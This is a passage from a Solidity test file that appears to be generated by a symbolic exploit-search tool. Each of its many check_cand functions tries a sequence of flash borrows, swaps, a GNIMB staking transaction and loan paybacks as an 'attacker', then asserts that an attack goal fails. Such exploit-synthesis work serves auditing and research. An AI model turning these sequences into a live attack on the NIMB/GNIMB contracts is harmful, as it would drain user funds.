        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3653(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3654(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3655(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3656(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3657(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3658(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3659(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3660(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3661(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3662(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3663(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3664(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3665(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3666(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3667(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3668(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3669(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3670(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3671(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3672(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3673(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3674(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3675(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3676(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3677(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3678(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3679(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3680(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3681(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3682(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3683(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3684(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3685(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3686(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3687(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3688(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3689(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3690(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3691(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3692(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3693(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3694(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3695(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3696(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3697(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
